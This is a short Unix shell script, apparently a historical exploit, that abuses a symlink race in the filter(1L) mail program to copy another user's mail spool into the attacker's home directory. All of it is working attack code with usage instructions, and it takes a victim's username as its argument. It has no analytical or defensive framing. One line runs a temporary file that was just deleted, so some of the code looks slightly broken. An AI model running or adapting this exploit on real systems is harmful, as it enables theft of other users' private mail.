#!/bin/sh
# This shell script exploits a problem with filter(1L)
# it will follow symbolic links, on a read allowing
# us to steal a users mail file.
#
# Usage: fread.sh victimsusername
#
# Contents will be stored in ~/victimsusername.mail
#
# Dave M. (davem@cmu.edu <mailto:davem@cmu.edu>)
#

cp /var/spool/mail/$LOGNAME ~
cp /dev/null /var/spool/mail/$LOGNAME
echo 'if (always) forward' $LOGNAME > /tmp/fread-ftr.tmp

cat << _EOF_ >> /tmp/fread-msg.tmp
From: Dave
To: $LOGNAME
Subject: Filter Exploit

_EOF_

echo sleep 2 > /tmp/fread-sh.tmp
echo cat /tmp/fread-msg.tmp >> /tmp/fread-sh.tmp
chmod +x /tmp/fread-sh.tmp
/tmp/fread-sh.tmp|filter -f /tmp/fread-ftr.tmp &
FREAD=`ps|grep 'filter -f'|grep -v grep|awk '{print $1}'`
rm -f /tmp/filter.$FREAD
ln -s /var/spool/mail/$1 /tmp/filter.$FREAD
sleep 2
rm -f /tmp/fread-ftr.tmp /tmp/fread-msg.tmp /tmp/fread-sh.tmp
/tmp/fread-ftr.tmp /tmp/filter.$FREAD
FREAD=
cp /var/spool/mail/$LOGNAME ~/$1.mail
cp ~/$LOGNAME /var/spool/mail
more ~/$1.mail

